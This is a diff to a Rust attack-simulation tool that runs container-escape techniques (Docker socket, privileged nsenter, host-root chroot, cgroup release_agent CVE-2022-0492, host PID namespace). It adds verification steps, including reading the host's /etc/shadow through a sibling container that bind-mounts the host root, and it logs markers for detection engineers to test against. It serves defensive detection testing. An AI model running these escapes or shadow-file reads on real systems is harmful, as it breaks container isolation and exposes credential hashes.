@@ -355,6 +355,144 @@ pub fn get_gateway_ip_with_prefix(prefix: &str) -> Option<String> {
 }
 
 // =============================================================================
+// SHARED VERIFICATION HELPERS
+// Used by T1611-SOCK / MOUNT / CGROUP / PRIV / PIDNS to exercise post-escape
+// host access and emit consistent [VERIFIED] / [UNVERIFIED] log markers that
+// EDR/XDR detection chains can grep for.
+// =============================================================================
+
+/// Structured outcome of a verification step.
+#[derive(Debug, Clone)]
+pub struct VerificationResult {
+    pub verified: bool,
+    pub evidence: String,
+}
+
+/// Emit a consistent verification log line for a technique. When `critical`
+/// is true a successful verification is logged at the elevated marker
+/// `[CRITICAL] Host filesystem access VERIFIED` so detection engineers can
+/// alert on the highest-confidence post-escape signal.
+pub fn log_verification(prefix: &str, result: &VerificationResult, critical: bool) {
+    if result.verified {
+        info!("[{}] [VERIFIED] {}", prefix, result.evidence);
+        if critical {
+            info!(
+                "[{}] [CRITICAL] Host filesystem access VERIFIED: {}",
+                prefix, result.evidence
+            );
+        }
+    } else {
+        info!("[{}] [UNVERIFIED] {}", prefix, result.evidence);
+    }
+}
+
+/// Emit a consistent verification log line for a privilege escalation technique.
+/// Always emits `[VERIFIED]` or `[UNVERIFIED]`. On success, additionally emits a
+/// `[CRITICAL] Privilege escalation VERIFIED` marker so SIEM rules can alert on
+/// the highest-confidence post-escalation signal.
+pub fn log_privesc_verification(prefix: &str, result: &VerificationResult) {
+    if result.verified {
+        info!("[{}] [VERIFIED] {}", prefix, result.evidence);
+        info!(
+            "[{}] [CRITICAL] Privilege escalation VERIFIED: {}",
+            prefix, result.evidence
+        );
+    } else {
+        info!("[{}] [UNVERIFIED] {}", prefix, result.evidence);
+    }
+}
+
+/// Run a command with a wall-clock timeout and capture stdout/stderr.
+/// Returns a `VerificationResult` whose `verified` flag is set when the
+/// command exits 0 *and* the supplied `predicate` matches stdout.
+pub async fn verify_command(
+    prefix: &str,
+    program: &str,
+    args: &[&str],
+    timeout_ms: u64,
+    predicate: impl Fn(&str) -> bool,
+) -> VerificationResult {
+    debug!(
+        "[{}] verify_command: {} {:?} (timeout {}ms)",
+        prefix, program, args, timeout_ms
+    );
+
+    let fut = Command::new(program).args(args).output();
+    let output = match tokio::time::timeout(std::time::Duration::from_millis(timeout_ms), fut).await
+    {
+        Ok(Ok(out)) => out,
+        Ok(Err(e)) => {
+            return VerificationResult {
+                verified: false,
+                evidence: format!("{} spawn error: {}", program, e),
+            };
+        }
+        Err(_) => {
+            return VerificationResult {
+                verified: false,
+                evidence: format!("{} timed out after {}ms", program, timeout_ms),
+            };
+        }
+    };
+
+    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+
+    if output.status.success() && predicate(&stdout) {
+        let snippet: String = stdout.lines().next().unwrap_or("").chars().take(120).collect();
+        VerificationResult {
+            verified: true,
+            evidence: format!("{} ok: {}", program, snippet),
+        }
+    } else {
+        let reason = if !output.status.success() {
+            format!("exit={:?} stderr={}", output.status.code(), stderr.trim())
+        } else {
+            "predicate did not match stdout".to_string()
+        };
+        VerificationResult {
+            verified: false,
+            evidence: format!("{} failed: {}", program, reason),
+        }
+    }
+}
+
+/// Poll for the appearance of a path (typically a marker file written on the
+/// host) at a fixed interval until either the file appears or the timeout
+/// expires. The default for callers is 10 s with a 500 ms interval.
+pub async fn poll_for_path(
+    prefix: &str,
+    path: &str,
+    timeout_ms: u64,
+    interval_ms: u64,
+) -> VerificationResult {
+    let start = std::time::Instant::now();
+    let deadline = start + std::time::Duration::from_millis(timeout_ms);
+    loop {
+        if Path::new(path).exists() {
+            let elapsed = start.elapsed().as_millis();
+            return VerificationResult {
+                verified: true,
+                evidence: format!("marker '{}' appeared after {}ms", path, elapsed),
+            };
+        }
+        if std::time::Instant::now() >= deadline {
+            return VerificationResult {
+                verified: false,
+                evidence: format!("timeout after {}ms waiting for '{}'", timeout_ms, path),
+            };
+        }
+        debug!(
+            "[{}] poll_for_path: {} not present yet (elapsed {}ms)",
+            prefix,
+            path,
+            start.elapsed().as_millis()
+        );
+        tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
+    }
+}
+
+// =============================================================================
 // T1611-SOCK: Docker Socket Escape
 // =============================================================================
 
@@ -455,6 +593,7 @@ impl AttackTechnique for DockerSocketEscape {
                 }
                 if attempt_run {
                     info!("[DRY RUN] - Execute: docker run --privileged --pid=host -v /:/host alpine id");
+                    info!("[DRY RUN] - Would verify host access via: docker run --rm -v /:/host alpine cat /host/etc/shadow (look for 'root:' prefix)");
                 }
                 info!("[DRY RUN] - Execute: curl to Docker API endpoints");
                 info!("[DRY RUN] - Execute: socat to Docker socket");
@@ -783,7 +922,68 @@ impl AttackTechnique for DockerSocketEscape {
                             debug!("[T1611-SOCK] Marker file verified on host");
                         }
                     }
+
+                    // Post-escape host access verification:
+                    // Spawn a privileged sibling container that bind-mounts the
+                    // host root and `cat`s /host/etc/shadow. A successful read
+                    // returning a `root:` line proves we have host filesystem
+                    // access, not just container-internal access.
+                    info!(
+                        "[T1611-SOCK] Verifying host filesystem access via docker run -v /:/host alpine cat /host/etc/shadow"
+                    );
+                    let shadow_check = verify_command(
+                        "T1611-SOCK",
+                        "docker",
+                        &[
+                            "run",
+                            "--rm",
+                            "-v",
+                            "/:/host:ro",
+                            "alpine:latest",
+                            "cat",
+                            "/host/etc/shadow",
+                        ],
+                        15_000,
+                        |stdout| stdout.lines().any(|l| l.starts_with("root:")),
+                    )
+                    .await;
+                    log_verification("T1611-SOCK", &shadow_check, true);
+                    if shadow_check.verified {
+                        findings.push(
+                            "[VERIFIED] Host /etc/shadow read via privileged sibling container"
+                                .to_string(),
+                        );
+                    } else {
+                        findings.push(format!(
+                            "[UNVERIFIED] Host /etc/shadow read failed: {}",
+                            shadow_check.evidence
+                        ));
+                    }
+                } else {
+                    // Escape primitive ran but the marker was never created
+                    // on the host. Emit an explicit [UNVERIFIED] so the
+                    // marker stream is consistent across runs.
+                    let result = VerificationResult {
+                        verified: false,
+                        evidence:
+                            "host marker not created by privileged sibling container - skipping host filesystem read"
+                                .to_string(),
+                    };
+                    log_verification("T1611-SOCK", &result, false);
+                    findings.push(format!("[UNVERIFIED] {}", result.evidence));
                 }
+            } else {
+                // attempt_run=false: no escape primitive was attempted, so
+                // there can be no host access. Emit [UNVERIFIED] anyway so
+                // every run emits a verification marker.
+                let result = VerificationResult {
+                    verified: false,
+                    evidence:
+                        "attempt_run=false - escape primitive was not exercised, host access not attempted"
+                            .to_string(),
+                };
+                log_verification("T1611-SOCK", &result, false);
+                findings.push(format!("[UNVERIFIED] {}", result.evidence));
             }
 
             // 8. docker inspect self - Container introspection
@@ -1450,6 +1650,9 @@ impl AttackTechnique for PrivilegedContainerEscape {
                     info!(
                         "[DRY RUN] - Execute: nsenter --target 1 --mount --uts --ipc --net --pid"
                     );
+                    info!(
+                        "[DRY RUN] - Would verify host access via: nsenter --target 1 --mount --pid -- cat /proc/1/comm (predicate: value matches host init name systemd|init|upstart|openrc|sysvinit|launchd; rejects container entrypoint)"
+                    );
                 }
                 info!("[DRY RUN] - Execute: debugfs (if available)");
                 info!("[DRY RUN] - Write findings to: {}", output_dir);
@@ -1896,6 +2099,62 @@ impl AttackTechnique for PrivilegedContainerEscape {
                     }
                 }
 
+                // Post-escape host access verification:
+                // Read /proc/1/comm from the host PID namespace via nsenter
+                // and require the value to match a known host init binary
+                // (systemd, init, upstart, openrc, sysvinit, launchd). If
+                // nsenter actually entered the host's PID namespace then
+                // /proc/1 is the host's init process and /proc/1/comm will
+                // match. If nsenter silently fell through to the container's
+                // own /proc, /proc/1/comm will be the container entrypoint
+                // (typically a shell or application binary) and the match
+                // will fail. This makes the check host-discriminating rather
+                // than merely "non-empty cmdline".
+                info!(
+                    "[T1611-PRIV] Verifying host PID namespace access via nsenter --target 1 --mount --pid -- cat /proc/1/comm"
+                );
+                let comm_check = verify_command(
+                    "T1611-PRIV",
+                    "nsenter",
+                    &[
+                        "--target",
+                        "1",
+                        "--mount",
+                        "--pid",
+                        "--",
+                        "cat",
+                        "/proc/1/comm",
+                    ],
+                    10_000,
+                    |stdout| {
+                        let trimmed = stdout.trim();
+                        matches!(
+                            trimmed,
+                            "systemd"
+                                | "init"
+                                | "upstart"
+                                | "openrc"
+                                | "sysvinit"
+                                | "launchd"
+                        )
+                    },
+                )
+                .await;
+                if comm_check.verified {
+                    let evidence = comm_check.evidence.clone();
+                    log_verification("T1611-PRIV", &comm_check, true);
+                    findings.push(format!(
+                        "[VERIFIED] Host /proc/1/comm via nsenter matches host init: {}",
+                        evidence
+                    ));
+                } else {
+                    log_verification("T1611-PRIV", &comm_check, false);
+                    findings.push(format!(
+                        "[UNVERIFIED] Host /proc/1/comm via nsenter did not match host init: {}",
+                        comm_check.evidence
+                    ));
+                }
+
                 // Also try individual namespace escapes
                 for ns_type in &["--mount", "--pid", "--net", "--uts", "--ipc"] {
                     info!(
@@ -2126,6 +2385,9 @@ impl AttackTechnique for SensitiveMountEscape {
                 if test_write {
                     info!("[DRY RUN] - Execute: touch /etc/signalbench_test");
                     info!("[DRY RUN] - Execute: mount --bind / /tmp/signalbench_bind");
+                    info!(
+                        "[DRY RUN] - Would verify host access via: chroot <bind_target>|/host /bin/cat /etc/machine-id and compare against the container's own /etc/machine-id (different value proves the chroot landed on a separate host filesystem)"
+                    );
                 }
                 info!("[DRY RUN] - Write findings to: {}", output_dir);
 
@@ -2436,6 +2698,52 @@ impl AttackTechnique for SensitiveMountEscape {
                         }
                     }
 
+                    // Post-escape host access verification:
+                    // Read /etc/machine-id from inside the chroot and compare
+                    // it to the container's own /etc/machine-id (read
+                    // directly). The machine-id is a per-installation
+                    // identifier; if the chroot's value differs from the
+                    // container's, the chroot must have landed on a
+                    // genuinely different filesystem (the host root). Equal
+                    // values mean we chrooted into our own root and there is
+                    // no proof of host access. This is host-discriminating
+                    // in a way that `uname -a` is not.
+                    let container_machine_id =
+                        std::fs::read_to_string("/etc/machine-id").unwrap_or_default();
+                    let container_id_trim = container_machine_id.trim().to_string();
+                    info!(
+                        "[T1611-MOUNT] Verifying host execution via chroot {} cat /etc/machine-id (compare against container machine-id)",
+                        bind_target
+                    );
+                    let id_check = {
+                        let cid = container_id_trim.clone();
+                        verify_command(
+                            "T1611-MOUNT",
+                            "chroot",
+                            &[&bind_target, "/bin/cat", "/etc/machine-id"],
+                            10_000,
+                            move |stdout| {
+                                let chroot_id = stdout.trim();
+                                !chroot_id.is_empty()
+                                    && !cid.is_empty()
+                                    && chroot_id != cid
+                            },
+                        )
+                        .await
+                    };
+                    log_verification("T1611-MOUNT", &id_check, true);
+                    if id_check.verified {
+                        findings.push(format!(
+                            "[VERIFIED] chroot {} /etc/machine-id differs from container (host root reached): {}",
+                            bind_target, id_check.evidence
+                        ));
+                    } else {
+                        findings.push(format!(
+                            "[UNVERIFIED] chroot {} /etc/machine-id check did not prove host access (container machine-id='{}'): {}",
+                            bind_target, container_id_trim, id_check.evidence
+                        ));
+                    }
+
                     // Cleanup: unmount bind mount
                     let _ = Command::new("umount").args([&bind_target]).output().await;
                 }
@@ -2481,6 +2789,46 @@ impl AttackTechnique for SensitiveMountEscape {
                         Err(e) => {
                             findings.push(format!("[EXEC] /host chroot marker - ERROR: {}", e));
                         }
+                    }
+
+                    // Post-escape host access verification:
+                    // As above, compare /etc/machine-id read through the
+                    // /host chroot to the container's own /etc/machine-id.
+                    // Different values prove the chroot resolved to a
+                    // genuinely separate filesystem.
+                    let container_machine_id =
+                        std::fs::read_to_string("/etc/machine-id").unwrap_or_default();
+                    let container_id_trim = container_machine_id.trim().to_string();
+                    info!(
+                        "[T1611-MOUNT] Verifying host execution via chroot /host cat /etc/machine-id (compare against container machine-id)"
+                    );
+                    let id_check = {
+                        let cid = container_id_trim.clone();
+                        verify_command(
+                            "T1611-MOUNT",
+                            "chroot",
+                            &["/host", "/bin/cat", "/etc/machine-id"],
+                            10_000,
+                            move |stdout| {
+                                let chroot_id = stdout.trim();
+                                !chroot_id.is_empty()
+                                    && !cid.is_empty()
+                                    && chroot_id != cid
+                            },
+                        )
+                        .await
+                    };
+                    log_verification("T1611-MOUNT", &id_check, true);
+                    if id_check.verified {
+                        findings.push(format!(
+                            "[VERIFIED] chroot /host /etc/machine-id differs from container (host root reached): {}",
+                            id_check.evidence
+                        ));
+                    } else {
+                        findings.push(format!(
+                            "[UNVERIFIED] chroot /host /etc/machine-id check did not prove host access (container machine-id='{}'): {}",
+                            container_id_trim, id_check.evidence
+                        ));
                     }
                 }
             }
@@ -2938,6 +3286,9 @@ impl AttackTechnique for CgroupReleaseAgentEscape {
                     info!("[DRY RUN] - Execute: mkdir /tmp/cgrp/x");
                     info!("[DRY RUN] - Execute: echo 1 > /tmp/cgrp/x/notify_on_release");
                     info!("[DRY RUN] - Execute: echo /path/payload > /tmp/cgrp/release_agent");
+                    info!(
+                        "[DRY RUN] - Would verify host access via: poll for marker '/tmp/signalbench_cgroup_escape_marker' (10s timeout, 500ms interval) after triggering release_agent"
+                    );
                 }
                 if simulate_payload {
                     info!("[DRY RUN] - Create simulated escape payload script");
@@ -3168,6 +3519,14 @@ impl AttackTechnique for CgroupReleaseAgentEscape {
                 }
             }
 
+            // Track whether the post-escape host access verification (the
+            // poll_for_path on the release_agent marker) actually ran. If the
+            // technique never reached the trigger phase (CAP_SYS_ADMIN
+            // missing, mount blocked, attempt_cgroup_mount=false, etc.) we
+            // still emit an explicit [UNVERIFIED] line so every run carries a
+            // verification marker.
+            let mut cgroup_verification_emitted = false;
+
             // Attempt cgroup operations
             if attempt_cgroup_mount {
                 let cgroup_test_dir = format!("{}/cgrp", output_dir);
@@ -3313,20 +3672,46 @@ impl AttackTechnique for CgroupReleaseAgentEscape {
                                                     .to_string(),
                                             );
 
-                                            // Give release_agent time to execute
-                                            tokio::time::sleep(std::time::Duration::from_millis(
+                                            // Post-escape host access verification:
+                                            // Poll for the release_agent
+                                            // marker on the host filesystem.
+                                            // Default 10s timeout, 500ms
+                                            // interval. release_agent fires
+                                            // asynchronously when the last
+                                            // PID leaves the cgroup, so a
+                                            // poll loop is the only reliable
+                                            // way to observe success.
+                                            info!(
+                                                "[T1611-CGROUP] Polling for release_agent marker '{}' (timeout 10s, interval 500ms)",
+                                                host_marker_path
+                                            );
+                                            let marker_check = poll_for_path(
+                                                "T1611-CGROUP",
+                                                host_marker_path,
+                                                10_000,
                                                 500,
-                                            ))
+                                            )
                                             .await;
-
-                                            // Check if marker file was created
-                                            if Path::new(host_marker_path).exists() {
+                                            log_verification(
+                                                "T1611-CGROUP",
+                                                &marker_check,
+                                                true,
+                                            );
+                                            cgroup_verification_emitted = true;
+                                            if marker_check.verified {
                                                 findings.push(format!("[ESCAPE] Host marker file created via release_agent: {}", host_marker_path));
                                                 findings.push("[ESCAPE] CVE-2022-0492 container escape CONFIRMED!".to_string());
+                                                findings.push(format!(
+                                                    "[VERIFIED] {}",
+                                                    marker_check.evidence
+                                                ));
                                                 artefacts.push(host_marker_path.to_string());
                                                 info!("[T1611-CGROUP] [CRITICAL] Container escape via release_agent SUCCESSFUL");
                                             } else {
-                                                findings.push("[INFO] Marker file not found - release_agent may not have executed".to_string());
+                                                findings.push(format!(
+                                                    "[UNVERIFIED] release_agent did not execute: {}",
+                                                    marker_check.evidence
+                                                ));
                                                 debug!(
                                                     "[T1611-CGROUP] Marker file not found at: {}",
                                                     host_marker_path
@@ -3507,6 +3892,23 @@ echo "[SIMULATED] Reverse shell or other payload here"
                 "cgroup release_agent escape not feasible - missing required capabilities or mounts"
                     .to_string()
             };
+
+            // If we never reached the poll_for_path verification phase
+            // (preconditions not met or trigger blocked), emit a single
+            // explicit [UNVERIFIED] line so every run carries a marker.
+            if !cgroup_verification_emitted {
+                let result = VerificationResult {
+                    verified: false,
+                    evidence: format!(
+                        "release_agent verification phase not reached (attempt_cgroup_mount={}, has_sys_admin={}, cgroup_mounts={})",
+                        attempt_cgroup_mount,
+                        has_sys_admin,
+                        cgroup_mounts.len()
+                    ),
+                };
+                log_verification("T1611-CGROUP", &result, false);
+                findings.push(format!("[UNVERIFIED] {}", result.evidence));
+            }
 
             info!("[T1611-CGROUP] Technique complete: {}", message);
 
@@ -5102,6 +5504,9 @@ impl AttackTechnique for HostPidNamespaceEscape {
                 info!("[DRY RUN] - Execute: cat /proc/1/cmdline");
                 info!("[DRY RUN] - Execute: ls -la /proc/1");
                 info!("[DRY RUN] - Execute: readlink /proc/1/ns/pid");
+                info!(
+                    "[DRY RUN] - Would verify host access via: read /proc/1/comm + /proc/1/cmdline against host-init baseline (systemd/init/upstart/openrc/sysvinit/launchd; /sbin/init, /lib/systemd/systemd, /usr/lib/systemd/systemd, /usr/sbin/init) AND count numeric /proc entries; verified only when both an init-style PID 1 is observed AND visible PID count exceeds 50 (typical container ceiling)"
+                );
                 if enumerate_processes {
                     info!("[DRY RUN] - Execute: pstree");
                     info!("[DRY RUN] - Execute: cat /proc/1/status");
@@ -5243,15 +5648,108 @@ impl AttackTechnique for HostPidNamespaceEscape {
                 if output.status.success() {
                     let self_ns = String::from_utf8_lossy(&output.stdout).trim().to_string();
                     findings.push(format!("[EXEC] readlink /proc/self/ns/pid - {}", self_ns));
+                }
+            }
 
-                    if !pid1_ns.is_empty() && pid1_ns == self_ns {
-                        findings.push(
-                            "[CRITICAL] Same PID namespace as PID 1 - host namespace shared!"
-                                .to_string(),
-                        );
+            // Post-escape host access verification.
+            //
+            // Comparing readlink /proc/1/ns/pid to readlink /proc/self/ns/pid
+            // from the same vantage point is unsound: in a normal container
+            // both calls return the *container's* PID namespace inode, and in
+            // a --pid=host container both calls return the *host's* PID
+            // namespace inode, so they always match. The observable
+            // consequence of sharing the host PID namespace is instead that
+            // the container can see the host's PID 1 (a real init system) and
+            // a much larger process table than a typical container affords.
+            //
+            // We therefore verify against a host baseline by reading
+            // /proc/1/comm (host init names: systemd, init, upstart, openrc,
+            // sysvinit, launchd) and /proc/1/cmdline (host init paths:
+            // /sbin/init, /lib/systemd/systemd, /usr/lib/systemd/systemd) and
+            // counting numeric entries under /proc as a process-table proxy.
+            // Verification requires both signals: an init-style PID 1 *and* a
+            // process count well above the typical container ceiling.
+            let comm_output = Command::new("cat").args(["/proc/1/comm"]).output().await;
+            let pid1_comm = match comm_output {
+                Ok(o) if o.status.success() => {
+                    String::from_utf8_lossy(&o.stdout).trim().to_string()
+                }
+                _ => String::new(),
+            };
+            findings.push(format!("[EXEC] cat /proc/1/comm - '{}'", pid1_comm));
+
+            let cmdline_re = Command::new("cat").args(["/proc/1/cmdline"]).output().await;
+            let pid1_cmdline = match cmdline_re {
+                Ok(o) if o.status.success() => {
+                    String::from_utf8_lossy(&o.stdout).replace('\0', " ").trim().to_string()
+                }
+                _ => String::new(),
+            };
+
+            let mut visible_pids: usize = 0;
+            if let Ok(entries) = std::fs::read_dir("/proc") {
+                for entry in entries.flatten() {
+                    if let Some(name) = entry.file_name().to_str() {
+                        if name.chars().all(|c| c.is_ascii_digit()) {
+                            visible_pids += 1;
+                        }
                     }
                 }
             }
+            findings.push(format!(
+                "[EXEC] /proc numeric-PID count - {}",
+                visible_pids
+            ));
+
+            const HOST_INIT_NAMES: &[&str] =
+                &["systemd", "init", "upstart", "openrc", "sysvinit", "launchd"];
+            const HOST_INIT_PATHS: &[&str] = &[
+                "/sbin/init",
+                "/lib/systemd/systemd",
+                "/usr/lib/systemd/systemd",
+                "/usr/sbin/init",
+            ];
+            const PID_COUNT_THRESHOLD: usize = 50;
+
+            let comm_matches_host =
+                !pid1_comm.is_empty() && HOST_INIT_NAMES.iter().any(|n| pid1_comm == *n);
+            let cmdline_matches_host = HOST_INIT_PATHS.iter().any(|p| pid1_cmdline.starts_with(p));
+            let init_matches_host = comm_matches_host || cmdline_matches_host;
+            let pid_count_high = visible_pids > PID_COUNT_THRESHOLD;
+
+            let pidns_result = if init_matches_host && pid_count_high {
+                VerificationResult {
+                    verified: true,
+                    evidence: format!(
+                        "PID 1 comm='{}' cmdline='{}' matches host init AND visible PIDs={} > {} (host PID namespace shared)",
+                        pid1_comm, pid1_cmdline, visible_pids, PID_COUNT_THRESHOLD
+                    ),
+                }
+            } else {
+                VerificationResult {
+                    verified: false,
+                    evidence: format!(
+                        "host PID namespace not confirmed: PID 1 comm='{}' (host-init match={}), cmdline='{}' (host-init match={}), visible PIDs={} (>{} required={})",
+                        pid1_comm,
+                        comm_matches_host,
+                        pid1_cmdline,
+                        cmdline_matches_host,
+                        visible_pids,
+                        PID_COUNT_THRESHOLD,
+                        pid_count_high
+                    ),
+                }
+            };
+            log_verification("T1611-PIDNS", &pidns_result, true);
+            if pidns_result.verified {
+                findings.push(format!("[VERIFIED] {}", pidns_result.evidence));
+            } else {
+                findings.push(format!("[UNVERIFIED] {}", pidns_result.evidence));
+            }
+            // Touch pid1_ns so the existing telemetry capture is retained
+            // without dead-code warnings even when the namespace inodes were
+            // not used for verification.
+            let _ = &pid1_ns;
 
             // Process enumeration with pstree
             if enumerate_processes {
